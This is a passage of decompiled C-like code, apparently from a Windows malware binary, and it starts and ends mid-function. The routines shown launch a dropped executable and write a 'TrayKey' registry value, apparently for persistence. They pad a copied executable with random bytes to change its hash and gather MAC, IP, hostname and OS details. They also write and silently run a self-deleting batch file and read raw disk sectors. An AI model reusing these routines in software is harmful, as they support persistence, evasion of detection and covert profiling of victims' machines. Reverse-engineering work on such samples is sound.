    FUN_00402f20();
    FUN_00403ae0(&local_444);
    if (DAT_0042d150 != (void *)0x0) {
      FUN_00410837(DAT_0042d150);
      DAT_0042d150 = (void *)0x0;
    }
    Sleep(100);
    ShellExecuteW((HWND)0x0,(LPCWSTR)0x0,&local_444,(LPCWSTR)&DAT_00428588,(LPCWSTR)0x0,1);
    LVar3 = RegOpenKeyExW((HKEY)0x80000001,u_Software_Microsoft_Windows_NT_Cu_00428590,0,3,&local_34
                         );
    if (LVar3 == 0) {
      local_4c4 = &local_30;
      do {
        WVar1 = *local_4c4;
        local_4c4 = local_4c4 + 1;
      } while (WVar1 != L'\0');
      LVar3 = RegSetValueExW(local_34,u_TrayKey_004285fc,0,1,(BYTE *)&local_30,
                             ((int)local_4c4 - (int)&local_2e >> 1) * 2 + 2);
      if (LVar3 == 0) {
        RegCloseKey(local_34);
      }
    }
  }
LAB_00403465:
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_00403480(LPWSTR param_1,int param_2)

{
  if (param_2 == 0) {
    GetSystemDirectoryW(param_1,0x104);
    _wcscat_s(param_1,0x104,(wchar_t *)&DAT_00428614);
  }
  else {
    GetTempPathW(0x104,param_1);
  }
  return;
}



undefined4 __cdecl FUN_004034d0(wchar_t *param_1,wchar_t *param_2,size_t param_3)

{
  errno_t eVar1;
  undefined4 uVar2;
  size_t _ElementSize;
  void *_DstBuf;
  FILE *local_c;
  undefined4 local_8;
  
  local_8 = 0;
  local_c = (FILE *)0x0;
  eVar1 = __wfopen_s(&local_c,param_1,(wchar_t *)&DAT_00428618);
  if (eVar1 == 0) {
    _fseek(local_c,0,2);
    _ElementSize = _ftell(local_c);
    _fseek(local_c,0,0);
    _DstBuf = _malloc(_ElementSize + param_3);
    _fread(_DstBuf,_ElementSize,1,local_c);
    _fclose(local_c);
    FUN_00404a40((void *)((int)_DstBuf + _ElementSize),param_3);
    eVar1 = __wfopen_s(&local_c,param_2,(wchar_t *)&DAT_00428620);
    if (eVar1 == 0) {
      _fwrite(_DstBuf,_ElementSize + param_3,1,local_c);
      _fclose(local_c);
      uVar2 = 1;
    }
    else {
      uVar2 = 0;
    }
  }
  else {
    uVar2 = 0;
  }
  return uVar2;
}



void __cdecl FUN_004035e0(undefined4 *param_1)

{
  short sVar1;
  wchar_t wVar2;
  int iVar3;
  short *local_2fc;
  short *local_2f8;
  wchar_t *local_2ec;
  wchar_t *local_2e8;
  short *local_2dc;
  short *local_2d8;
  undefined local_2d4 [74];
  undefined4 local_28a;
  undefined2 local_286;
  undefined4 local_284;
  short local_27c [36];
  undefined2 local_234;
  undefined local_232 [522];
  wchar_t local_28;
  undefined4 local_26;
  undefined4 local_22;
  undefined4 local_1e;
  undefined4 local_1a;
  undefined4 local_16;
  undefined4 local_12;
  undefined4 local_e;
  undefined2 local_a;
  uint local_8;
  
  local_8 = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  local_234 = 0;
  _memset(local_232,0,0x206);
  local_28 = L'\0';
  local_26 = 0;
  local_22 = 0;
  local_1e = 0;
  local_1a = 0;
  local_16 = 0;
  local_12 = 0;
  local_e = 0;
  local_a = 0;
  _memset(local_2d4,0,0x9a);
  _memset(param_1,0,0x200);
  iVar3 = FUN_004047f0(local_2d4);
  if (iVar3 != 0) {
    *param_1 = 0x1000000;
    param_1[1] = (uint)DAT_0042cca3 * 0x1000000 + (uint)DAT_0042cca2 * 0x10000 +
                 (uint)DAT_0042cca1 * 0x100 + (uint)DAT_0042cca0;
    param_1[2] = DAT_0042b5f0;
    param_1[3] = local_284;
    param_1[4] = local_28a;
    *(undefined2 *)(param_1 + 5) = local_286;
    local_2d8 = local_27c;
    local_2dc = (short *)((int)param_1 + 0x16);
    do {
      sVar1 = *local_2d8;
      *local_2dc = sVar1;
      local_2d8 = local_2d8 + 1;
      local_2dc = local_2dc + 1;
    } while (sVar1 != 0);
    iVar3 = FUN_00404660();
    local_2e8 = u_UnKmownOS_0042b068 + iVar3 * 10;
    local_2ec = (wchar_t *)((int)param_1 + 0x96);
    do {
      wVar2 = *local_2e8;
      *local_2ec = wVar2;
      local_2e8 = local_2e8 + 1;
      local_2ec = local_2ec + 1;
    } while (wVar2 != L'\0');
    *(undefined4 *)((int)param_1 + 0x196) = DAT_0042cd9e;
    *(undefined4 *)((int)param_1 + 0x19a) = DAT_0042cda2;
    local_2f8 = &DAT_0042cda6;
    local_2fc = (short *)((int)param_1 + 0x19e);
    do {
      sVar1 = *local_2f8;
      *local_2fc = sVar1;
      local_2f8 = local_2f8 + 1;
      local_2fc = local_2fc + 1;
    } while (sVar1 != 0);
    FUN_00404500(DAT_0042cd9e,&local_28);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00403870(void)

{
  short sVar1;
  short *local_2c;
  short *local_28;
  short *local_1c;
  short *local_18;
  short *local_c;
  short *local_8;
  
  _DAT_0042cca0 = DAT_0042d098;
  DAT_0042cd98 = FUN_004043b0((wchar_t *)&DAT_0042cf76);
  DAT_0042cd9c = DAT_0042cff6;
  DAT_0042cd9e = FUN_004043b0((wchar_t *)&DAT_0042ced4);
  DAT_0042cda2 = (uint)DAT_0042cf54;
  local_8 = &DAT_0042cf56;
  local_c = &DAT_0042cda6;
  do {
    sVar1 = *local_8;
    *local_c = sVar1;
    local_8 = local_8 + 1;
    local_c = local_c + 1;
  } while (sVar1 != 0);
  local_18 = &DAT_0042d078;
  local_1c = &DAT_0042cdc6;
  do {
    sVar1 = *local_18;
    *local_1c = sVar1;
    local_18 = local_18 + 1;
    local_1c = local_1c + 1;
  } while (sVar1 != 0);
  local_28 = &DAT_0042d058;
  local_2c = &DAT_0042cde6;
  do {
    sVar1 = *local_28;
    *local_2c = sVar1;
    local_28 = local_28 + 1;
    local_2c = local_2c + 1;
  } while (sVar1 != 0);
  return;
}



void FUN_00403990(void)

{
  WCHAR WVar1;
  undefined4 *puVar2;
  undefined4 *local_220;
  WCHAR *local_214;
  undefined local_210 [4];
  WCHAR local_20c;
  undefined auStack_20a [510];
  uint local_c;
  HANDLE local_8;
  
  local_c = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  local_20c = DAT_00428658;
  _memset(auStack_20a,0,0x1fe);
  local_210 = (undefined  [4])&DAT_0042d0d0;
  local_214 = &local_20c;
  do {
    WVar1 = *(WCHAR *)local_210;
    *local_214 = WVar1;
    local_210 = (undefined  [4])((int)local_210 + 2);
    local_214 = local_214 + 1;
  } while (WVar1 != L'\0');
  puVar2 = (undefined4 *)(local_210 + 2);
  do {
    local_220 = puVar2;
    puVar2 = (undefined4 *)((int)local_220 + 2);
  } while (*(short *)((int)local_220 + 2) != 0);
  *(undefined4 *)((int)local_220 + 2) = u__STOP_0042865c._0_4_;
  *(undefined4 *)((int)local_220 + 6) = u__STOP_0042865c._4_4_;
  *(undefined4 *)((int)local_220 + 10) = u__STOP_0042865c._8_4_;
  local_8 = (HANDLE)0x0;
  while (local_8 == (HANDLE)0x0) {
    local_8 = OpenEventW(0x20000,0,&local_20c);
    Sleep(200);
  }
  CloseHandle(local_8);
                    // WARNING: Subroutine does not return
  ExitProcess(0);
}



undefined4 __cdecl FUN_00403ae0(LPCWSTR param_1)

{
  DWORD DVar1;
  undefined4 *_Memory;
  int iVar2;
  ulonglong uVar3;
  void *local_20;
  undefined8 local_1c;
  undefined4 local_14;
  int local_10;
  int local_c;
  undefined4 local_8;
  
  local_14 = 0;
  local_8 = 0;
  local_10 = *(int *)(DAT_0042d150 + 0x1fc);
  local_c = 0;
  DVar1 = GetFileAttributesW(param_1);
  if (DVar1 != 0xffffffff) {
    local_1c = FUN_00404770(param_1);
    if ((int)local_1c == local_10) {
      local_c = 1;
      local_8 = 1;
    }
  }
  if (local_c == 0) {
    _Memory = (undefined4 *)_malloc(0x100000);
    local_20 = (void *)0x100000;
    iVar2 = FUN_00408cd0((LPCWSTR)(DAT_0042d150 + 0x200),local_10,_Memory,&local_20,&DAT_00428684);
    if (iVar2 != 0) {
      DVar1 = GetTickCount();
      FUN_004106d3(DVar1);
      uVar3 = FUN_00403d30(0x32,200);
      FUN_00404a40((void *)((int)_Memory + (int)local_20),(size_t)uVar3);
      local_20 = (void *)((int)local_20 + (size_t)uVar3);
      iVar2 = FUN_00408b10(param_1,_Memory,(DWORD)local_20);
      if (iVar2 == 1) {
        local_8 = 1;
      }
      else {
        local_8 = 0;
      }
    }
    _free(_Memory);
  }
  return local_8;
}



void __cdecl FUN_00403c10(wchar_t *param_1,wchar_t *param_2)

{
  _vswprintf_s(param_1,0x104,param_2,&stack0x0000000c);
  return;
}



void __cdecl FUN_00403c40(wchar_t *param_1,wchar_t *param_2)

{
  _wcscpy_s(param_1,0x40,param_2);
  return;
}



void __cdecl FUN_00403c60(wchar_t *param_1,wchar_t *param_2)

{
  _wcscpy_s(param_1,0x10,param_2);
  return;
}



void __cdecl FUN_00403c80(wchar_t *param_1,wchar_t *param_2)

{
  _wcsstr(param_1,param_2);
  return;
}



void __cdecl FUN_00403ca0(wchar_t *param_1,wchar_t param_2)

{
  _wcsrchr(param_1,param_2);
  return;
}



void __cdecl FUN_00403cc0(wchar_t *param_1)

{
  undefined2 *puVar1;
  WCHAR local_214 [262];
  uint local_8;
  
  local_8 = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  GetModuleFileNameW((HMODULE)0x0,local_214,0x104);
  puVar1 = (undefined2 *)FUN_00403ca0(local_214,L'\\');
  *puVar1 = 0;
  _wcscpy_s(param_1,0x104,local_214);
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

ulonglong FUN_00403d30(undefined4 param_1,undefined4 param_2)

{
  undefined4 extraout_ECX;
  undefined4 extraout_EDX;
  ulonglong uVar1;
  
  _rand();
  uVar1 = FUN_0041d520(extraout_ECX,extraout_EDX);
  return uVar1;
}



void __cdecl FUN_00403d80(undefined4 param_1,undefined4 param_2,int param_3)

{
  uint uVar1;
  ulonglong uVar2;
  int local_88;
  int local_84;
  int local_80;
  int local_7c;
  int local_74 [27];
  int local_8;
  
  for (local_80 = 0; local_80 < 0x1a; local_80 = local_80 + 1) {
    local_74[local_80] = -1;
  }
  local_74[24] = 1;
  local_74[20] = 1;
  local_74[14] = 1;
  local_74[8] = 1;
  local_74[4] = 1;
  local_74[0] = 1;
  uVar2 = FUN_00403d30(param_1,param_2);
  local_8 = (int)uVar2;
  local_7c = 0;
  for (local_84 = 0; local_84 < local_8; local_84 = local_84 + 1) {
    uVar2 = FUN_00403d30(0,0x1a);
    local_88 = (int)uVar2;
    while (uVar1 = local_7c + local_74[local_88] >> 0x1f,
          1 < (int)((local_7c + local_74[local_88] ^ uVar1) - uVar1)) {
      local_88 = local_88 + 1;
      if (local_88 == 0x1a) {
        local_88 = 0;
      }
    }
    local_7c = local_7c + local_74[local_88];
    *(short *)(param_3 + local_84 * 2) = (short)local_88 + 0x61;
  }
  return;
}



LPWSTR __cdecl FUN_00403e90(LPCSTR param_1,LPWSTR param_2,int param_3)

{
  char cVar1;
  char *local_10;
  int local_c;
  
  local_10 = param_1;
  do {
    cVar1 = *local_10;
    local_10 = local_10 + 1;
  } while (cVar1 != '\0');
  local_c = (int)local_10 - (int)(param_1 + 1);
  if (param_2 == (LPWSTR)0x0) {
    param_3 = MultiByteToWideChar(0,0,param_1,-1,(LPWSTR)0x0,0);
    param_2 = (LPWSTR)_malloc(param_3 << 1);
  }
  if (local_c == 0) {
    *param_2 = L'\0';
  }
  else {
    if ((0 < param_3) && (param_3 + -1 < local_c)) {
      local_c = param_3 + -1;
    }
    MultiByteToWideChar(0,0,param_1,-1,param_2,local_c + 1);
  }
  return param_2;
}



bool __cdecl FUN_00403f50(wchar_t *param_1,LPWSTR param_2)

{
  wchar_t wVar1;
  undefined4 *puVar2;
  wchar_t *pwVar3;
  int iVar4;
  bool bVar5;
  wchar_t *local_48;
  int local_40;
  int local_3c;
  hostent *local_38;
  undefined4 local_34;
  wchar_t *local_30 [4];
  undefined4 local_20;
  undefined4 local_1c;
  undefined4 local_18;
  undefined4 local_14;
  undefined4 local_10;
  undefined4 local_c;
  uint local_8;
  
  local_30[0] = (wchar_t *)0x0;
  local_30[1] = (wchar_t *)0x0;
  local_30[2] = (wchar_t *)0x0;
  local_30[3] = (wchar_t *)0x0;
  local_20 = 0;
  local_1c = 0;
  local_18 = 0;
  local_14 = 0;
  local_10 = 0;
  local_c = 0;
  local_3c = 0;
  for (local_40 = 0; local_40 < 10; local_40 = local_40 + 1) {
    pwVar3 = (wchar_t *)operator_new(0x20);
    local_30[local_40] = pwVar3;
    puVar2 = (undefined4 *)local_30[local_40];
    *puVar2 = 0;
    puVar2[1] = 0;
    puVar2[2] = 0;
    puVar2[3] = 0;
    puVar2[4] = 0;
    puVar2[5] = 0;
    puVar2[6] = 0;
    puVar2[7] = 0;
  }
  local_48 = param_1;
  do {
    wVar1 = *local_48;
    local_48 = local_48 + 1;
  } while (wVar1 != L'\0');
  iVar4 = (int)local_48 - (int)(param_1 + 1) >> 1;
  if ((iVar4 == 0) || (param_1 == (wchar_t *)0x0)) {
    FUN_00404090((undefined4 *)0x0,(int)local_30,&local_3c);
    if (local_3c == 0) {
      return false;
    }
  }
  else {
    _wcscpy_s(local_30[0],0x10,param_1);
  }
  local_8 = FUN_004043b0(local_30[0]);
  local_34 = Ordinal_8(local_8,iVar4);
  local_38 = gethostbyaddr((char *)&local_34,4,2);
  bVar5 = local_38 != (hostent *)0x0;
  if (bVar5) {
    FUN_00403e90(local_38->h_name,param_2,0x20);
  }
  return bVar5;
}



void __cdecl FUN_00404090(undefined4 *param_1,int param_2,int *param_3)

{
  char cVar1;
  int iVar2;
  uint uVar3;
  undefined4 *local_50;
  int local_4c;
  int local_48;
  undefined4 *local_44;
  undefined4 *local_40;
  size_t local_38;
  int local_34;
  wchar_t local_30;
  undefined4 local_2e;
  undefined4 local_2a;
  undefined4 local_26;
  undefined4 local_22;
  undefined4 local_1e;
  undefined4 local_1a;
  undefined4 local_16;
  undefined2 local_12;
  uint local_10;
  int local_c;
  undefined4 *local_8;
  
  local_10 = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  local_8 = (undefined4 *)0x0;
  local_34 = -1;
  local_30 = L'\0';
  local_2e = 0;
  local_2a = 0;
  local_26 = 0;
  local_22 = 0;
  local_1e = 0;
  local_1a = 0;
  local_16 = 0;
  local_12 = 0;
  local_c = 0;
  local_8 = (undefined4 *)_malloc(0x288);
  local_38 = 0x288;
  iVar2 = GetAdaptersInfo(local_8,&local_38);
  if (iVar2 == 0x6f) {
    _free(local_8);
    local_8 = (undefined4 *)_malloc(local_38);
  }
  iVar2 = GetAdaptersInfo(local_8,&local_38);
  if (iVar2 == 0) {
    for (local_40 = local_8; local_40 != (undefined4 *)0x0; local_40 = (undefined4 *)*local_40) {
      local_34 = local_34 + 1;
      if (param_1 != (undefined4 *)0x0) {
        *param_1 = local_40[0x65];
        *(undefined2 *)(param_1 + 1) = *(undefined2 *)(local_40 + 0x66);
      }
      for (local_44 = local_40 + 0x6b; local_44 != (undefined4 *)0x0;
          local_44 = (undefined4 *)*local_44) {
        local_50 = local_44 + 1;
        do {
          cVar1 = *(char *)local_50;
          local_50 = (undefined4 *)((int)local_50 + 1);
        } while (cVar1 != '\0');
        local_48 = (int)local_50 - ((int)local_44 + 5);
        if (0x10 < local_48) {
          local_48 = 0x10;
        }
        for (local_4c = 0; local_4c <= local_48; local_4c = local_4c + 1) {
          if (local_4c == local_48) {
            (&local_30)[local_4c] = L'\0';
          }
          (&local_30)[local_4c] = (short)*(char *)((int)local_44 + local_4c + 4);
        }
        uVar3 = FUN_004043b0(&local_30);
        if (uVar3 != 0) {
          _wcscpy_s(*(wchar_t **)(param_2 + local_c * 4),0x10,&local_30);
        }
        local_c = local_c + 1;
      }
      if (0 < local_c) break;
    }
  }
  *param_3 = local_c;
  if (local_8 != (undefined4 *)0x0) {
    _free(local_8);
  }
  ___security_check_cookie_4(local_10 ^ (uint)&stack0xfffffffc);
  return;
}



int __cdecl FUN_004042a0(wchar_t *param_1,wchar_t *param_2,int param_3,rsize_t param_4)

{
  wchar_t wVar1;
  int iVar2;
  wchar_t *local_18;
  wchar_t *local_14;
  size_t local_c;
  int local_8;
  
  local_8 = 0;
  local_18 = param_1;
  do {
    wVar1 = *local_18;
    local_18 = local_18 + 1;
  } while (wVar1 != L'\0');
  if ((int)local_18 - (int)(param_1 + 1) >> 1 == 0) {
    local_8 = 0;
  }
  else {
    local_14 = param_1;
    while (iVar2 = FUN_00403c80(local_14,param_2), iVar2 != 0) {
      local_c = iVar2 - (int)local_14 >> 1;
      if ((int)param_4 < (int)local_c) {
        local_c = param_4;
      }
      _wcsncpy(*(wchar_t **)(param_3 + local_8 * 4),local_14,local_c);
      *(undefined2 *)(*(int *)(param_3 + local_8 * 4) + local_c * 2) = 0;
      local_14 = (wchar_t *)(iVar2 + 2);
      local_8 = local_8 + 1;
    }
    _wcscpy_s(*(wchar_t **)(param_3 + local_8 * 4),param_4,local_14);
    local_8 = local_8 + 1;
  }
  return local_8;
}



uint __cdecl FUN_004043b0(wchar_t *param_1)

{
  undefined4 *puVar1;
  wchar_t *pwVar2;
  longlong lVar3;
  longlong lVar4;
  longlong lVar5;
  longlong lVar6;
  wchar_t *local_20;
  wchar_t *local_1c [4];
  uint local_c;
  int local_8;
  
  local_1c[0] = (wchar_t *)0x0;
  local_1c[1] = (wchar_t *)0x0;
  local_1c[2] = (wchar_t *)0x0;
  local_1c[3] = (wchar_t *)0x0;
  for (local_8 = 0; local_8 < 4; local_8 = local_8 + 1) {
    pwVar2 = (wchar_t *)operator_new(0x20);
    local_1c[local_8] = pwVar2;
    puVar1 = (undefined4 *)local_1c[local_8];
    *puVar1 = 0;
    puVar1[1] = 0;
    puVar1[2] = 0;
    puVar1[3] = 0;
    puVar1[4] = 0;
    puVar1[5] = 0;
    puVar1[6] = 0;
    puVar1[7] = 0;
  }
  local_8 = FUN_004042a0(param_1,(wchar_t *)&DAT_00427fa0,(int)local_1c,0xf);
  if (local_8 == 4) {
    lVar3 = __wcstoi64(local_1c[0],&local_20,10);
    lVar4 = __wcstoi64(local_1c[1],&local_20,10);
    lVar5 = __wcstoi64(local_1c[2],&local_20,10);
    lVar6 = __wcstoi64(local_1c[3],&local_20,10);
    local_c = (int)lVar3 << 0x18 | (int)lVar4 << 0x10 | (int)lVar5 << 8 | (uint)lVar6;
    for (local_8 = 0; local_8 < 4; local_8 = local_8 + 1) {
      if (local_1c[local_8] != (wchar_t *)0x0) {
        FUN_00410837(local_1c[local_8]);
      }
    }
  }
  else {
    local_c = 0;
  }
  return local_c;
}



void __cdecl FUN_00404500(undefined4 param_1,wchar_t *param_2)

{
  wchar_t local_2c;
  undefined4 local_2a;
  undefined4 local_26;
  undefined4 local_22;
  undefined4 local_1e;
  undefined4 local_1a;
  undefined4 local_16;
  undefined4 local_12;
  undefined2 local_e;
  uint local_c;
  undefined local_7;
  undefined local_6;
  undefined local_5;
  
  local_c = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  local_2c = L'\0';
  local_2a = 0;
  local_26 = 0;
  local_22 = 0;
  local_1e = 0;
  local_1a = 0;
  local_16 = 0;
  local_12 = 0;
  local_e = 0;
  local_5 = (undefined)((uint)param_1 >> 8);
  local_7 = (undefined)((uint)param_1 >> 0x10);
  local_6 = (undefined)((uint)param_1 >> 0x18);
  FUN_00404ac0(&local_2c,u__d__d__d__d_00427fa4);
  _wcscpy_s(param_2,0x10,&local_2c);
  ___security_check_cookie_4(local_c ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_004045b0(undefined4 param_1,char *param_2)

{
  char local_1c;
  undefined4 local_1b;
  undefined4 local_17;
  undefined4 local_13;
  undefined2 local_f;
  undefined local_d;
  uint local_c;
  undefined local_5;
  
  local_c = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  local_1c = '\0';
  local_1b = 0;
  local_17 = 0;
  local_13 = 0;
  local_f = 0;
  local_d = 0;
  local_5 = (undefined)((uint)param_1 >> 8);
  FUN_00404af0(&local_1c,s__d__d__d__d_00427fbc);
  _strcpy_s(param_2,0x10,&local_1c);
  ___security_check_cookie_4(local_c ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_00404660(void)

{
  BOOL BVar1;
  _OSVERSIONINFOW local_134;
  ushort local_20;
  uint local_14;
  DWORD local_10;
  uint local_c;
  undefined4 local_8;
  
  local_14 = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  local_8 = 0;
  local_10 = 0;
  local_c = 0;
  local_134.dwOSVersionInfoSize = 0;
  _memset(&local_134.dwMajorVersion,0,0x118);
  local_134.dwOSVersionInfoSize = 0x11c;
  BVar1 = GetVersionExW(&local_134);
  if (BVar1 != 0) {
    local_10 = local_134.dwMajorVersion;
    local_c = local_134.dwMinorVersion;
    if (((local_134.dwMajorVersion == 5) && (local_134.dwMinorVersion == 0)) && (3 < local_20)) {
      local_8 = 1;
    }
    if ((local_134.dwMajorVersion == 5) && (local_134.dwMinorVersion == 2)) {
      local_8 = 2;
    }
    if ((local_134.dwMajorVersion == 5) &&
       ((1 < local_134.dwMinorVersion || (local_134.dwMinorVersion == 1)))) {
      local_8 = 3;
    }
    if (local_134.dwMajorVersion == 6) {
      if (local_134.dwMinorVersion == 0) {
        local_8 = 4;
      }
      else if (local_134.dwMinorVersion == 1) {
        local_8 = 5;
      }
    }
  }
  ___security_check_cookie_4(local_14 ^ (uint)&stack0xfffffffc);
  return;
}



undefined8 __cdecl FUN_00404770(LPCWSTR param_1)

{
  BOOL BVar1;
  LARGE_INTEGER local_18;
  HANDLE local_10;
  DWORD local_c;
  LONG local_8;
  
  local_c = 0xffffffff;
  local_8 = -1;
  local_10 = CreateFileW(param_1,0x80000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
  if (local_10 == (HANDLE)0xffffffff) {
    local_c = 0xffffffff;
    local_8 = -1;
  }
  else {
    BVar1 = GetFileSizeEx(local_10,&local_18);
    if (BVar1 == 1) {
      local_c = local_18.s.LowPart;
      local_8 = local_18.s.HighPart;
    }
    CloseHandle(local_10);
  }
  return CONCAT44(local_8,local_c);
}



// WARNING: Removing unreachable block (ram,0x00404958)

void __cdecl FUN_004047f0(void *param_1)

{
  undefined4 *puVar1;
  bool bVar2;
  wchar_t *pwVar3;
  uint uVar4;
  undefined3 extraout_var;
  WCHAR local_a4;
  undefined local_a2 [66];
  int local_60;
  wchar_t *local_5c [10];
  int local_34;
  undefined4 local_30;
  uint local_8;
  
  local_8 = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  local_5c[0] = (wchar_t *)0x0;
  local_5c[1] = (wchar_t *)0x0;
  local_5c[2] = (wchar_t *)0x0;
  local_5c[3] = (wchar_t *)0x0;
  local_5c[4] = (wchar_t *)0x0;
  local_5c[5] = (wchar_t *)0x0;
  local_5c[6] = (wchar_t *)0x0;
  local_5c[7] = (wchar_t *)0x0;
  local_5c[8] = (wchar_t *)0x0;
  local_5c[9] = (wchar_t *)0x0;
  local_60 = 0;
  local_30 = 0;
  local_34 = 0;
  _memset(param_1,0,0x9a);
  for (local_34 = 0; local_34 < 10; local_34 = local_34 + 1) {
    pwVar3 = (wchar_t *)operator_new(0x20);
    local_5c[local_34] = pwVar3;
    puVar1 = (undefined4 *)local_5c[local_34];
    *puVar1 = 0;
    puVar1[1] = 0;
    puVar1[2] = 0;
    puVar1[3] = 0;
    puVar1[4] = 0;
    puVar1[5] = 0;
    puVar1[6] = 0;
    puVar1[7] = 0;
  }
  FUN_00404090((undefined4 *)((int)param_1 + 0x4a),(int)local_5c,&local_60);
  if (0 < local_60) {
    uVar4 = FUN_004043b0(local_5c[0]);
    *(uint *)((int)param_1 + 0x50) = uVar4;
    local_a4 = L'\0';
    _memset(local_a2,0,0x3e);
    bVar2 = FUN_00403f50(local_5c[0],&local_a4);
    if (CONCAT31(extraout_var,bVar2) == 1) {
      _wcscpy_s((wchar_t *)((int)param_1 + 0x58),0x21,&local_a4);
      local_30 = 1;
    }
    else {
      local_30 = 0;
    }
  }
  for (local_34 = 0; local_34 < 10; local_34 = local_34 + 1) {
    local_5c[local_34] = (wchar_t *)0x0;
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_00404990(undefined4 param_1,LPWSTR param_2)

{
  WCHAR local_214;
  undefined local_212 [522];
  uint local_8;
  
  local_8 = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  local_214 = L'\0';
  _memset(local_212,0,0x206);
  if (DAT_0042b060 == 3) {
    GetSystemDirectoryW(&local_214,0x104);
    _wcscat_s(&local_214,0x104,(wchar_t *)&DAT_00427fc8);
  }
  else {
    GetTempPathW(0x104,&local_214);
  }
  wsprintfW(param_2,u__s_s_exe_00427fcc,&local_214,param_1);
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_00404a40(void *param_1,size_t param_2)

{
  DWORD DVar1;
  int iVar2;
  int local_14;
  
  _memset(param_1,0,param_2);
  DVar1 = GetTickCount();
  FUN_004106d3(DVar1);
  for (local_14 = 0; local_14 < (int)(param_2 + ((int)param_2 >> 0x1f & 3U)) >> 2;
      local_14 = local_14 + 1) {
    iVar2 = _rand();
    *(int *)((int)param_1 + local_14 * 4) = iVar2;
  }
  return;
}



void __cdecl FUN_00404ac0(wchar_t *param_1,wchar_t *param_2)

{
  _vswprintf_s(param_1,0x10,param_2,&stack0x0000000c);
  return;
}



void __cdecl FUN_00404af0(char *param_1,char *param_2)

{
  _vsprintf_s(param_1,0x10,param_2,&stack0x0000000c);
  return;
}



void FUN_00404b20(void)

{
  char *pcVar1;
  char cVar2;
  char *local_374;
  char *local_364;
  char *local_354;
  char *local_344;
  char local_334 [264];
  DWORD local_22c;
  char *local_228;
  CHAR local_224 [268];
  char *local_118;
  CHAR local_114 [264];
  uint local_c;
  HANDLE local_8;
  
  local_c = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  local_22c = 0;
  local_118 = (char *)0x0;
  GetTempPathA(0x104,local_114);
  FUN_00404e30(local_114,s__uinsey_bat_0042868c);
  GetModuleFileNameA((HMODULE)0x0,local_224,0x104);
  _strcpy_s(local_334,0x104,local_224);
  local_228 = strrchr(local_334,0x5c);
  if (local_228 != (char *)0x0) {
    *local_228 = '\0';
  }
  local_8 = CreateFileA(local_114,0x40000000,0,(LPSECURITY_ATTRIBUTES)0x0,2,0x80,(HANDLE)0x0);
  if (local_8 != (HANDLE)0xffffffff) {
    local_344 = s__Repeat_del___s__if_exist___s__g_0042b610;
    pcVar1 = local_344;
    do {
      local_344 = pcVar1;
      pcVar1 = local_344 + 1;
    } while (*local_344 != '\0');
    local_354 = local_224;
    do {
      cVar2 = *local_354;
      local_354 = local_354 + 1;
    } while (cVar2 != '\0');
    pcVar1 = local_114;
    do {
      local_364 = pcVar1;
      pcVar1 = local_364 + 1;
    } while (*local_364 != '\0');
    pcVar1 = local_344 + (int)local_354 * 3 + (int)&stack0x00000000 * -4 +
             (int)(local_364 + -0x42ae61);
    local_118 = (char *)operator_new((uint)pcVar1);
    _memset(local_118,0,(size_t)pcVar1);
    _sprintf_s(local_118,(size_t)pcVar1,s__Repeat_del___s__if_exist___s__g_0042b610,local_224,
               local_224,local_334,local_114);
    local_374 = local_118;
    do {
      cVar2 = *local_374;
      local_374 = local_374 + 1;
    } while (cVar2 != '\0');
    WriteFile(local_8,local_118,(int)local_374 - (int)(local_118 + 1),&local_22c,(LPOVERLAPPED)0x0);
    CloseHandle(local_8);
    ShellExecuteA((HWND)0x0,&DAT_00427ea8,local_114,(LPCSTR)0x0,(LPCSTR)0x0,0);
  }
  if (local_118 != (char *)0x0) {
    FUN_00410837(local_118);
    local_118 = (char *)0x0;
  }
  ___security_check_cookie_4(local_c ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_00404e30(char *param_1,char *param_2)

{
  _strcat_s(param_1,0x104,param_2);
  return;
}



// Library Function - Single Match
//  char * __cdecl strrchr(char *,int)
// 
// Libraries: Visual Studio 2005, Visual Studio 2008, Visual Studio 2010

char * __cdecl strrchr(char *param_1,int param_2)

{
  char *pcVar1;
  
  pcVar1 = _strrchr(param_1,param_2);
  return pcVar1;
}



BOOL __cdecl FUN_00404e70(HANDLE param_1,uint param_2,int param_3,LPVOID param_4)

{
  longlong lVar1;
  _OVERLAPPED local_28;
  undefined8 local_14;
  DWORD local_c;
  BOOL local_8;
  
  local_8 = 0;
  local_28.Internal = 0;
  local_28.InternalHigh = 0;
  local_28.u.s.Offset = 0;
  local_28.u.s.OffsetHigh = 0;
  local_28.hEvent = (HANDLE)0x0;
  local_c = 0;
  if (param_1 != (HANDLE)0xffffffff) {
    local_14 = (ulonglong)param_2;
    lVar1 = __allmul(param_2,0,0x200,0);
    local_14._0_4_ = (DWORD)lVar1;
    local_28.u.s.Offset = (DWORD)local_14;
    local_14._4_4_ = (DWORD)((ulonglong)lVar1 >> 0x20);
    local_28.u.s.OffsetHigh = local_14._4_4_;
    local_14 = lVar1;
    local_8 = ReadFile(param_1,param_4,param_3 << 9,&local_c,&local_28);
  }
  return local_8;
}



void __cdecl FUN_00404f00(int param_1)

{
  int iVar1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  wchar_t local_48;
  undefined4 local_46;
  undefined4 local_42;
  undefined4 local_3e;
  undefined4 local_3a;
  undefined2 local_36;
  undefined4 local_34 [9];
  undefined4 local_10;
  uint local_c;
  HANDLE local_8;
  
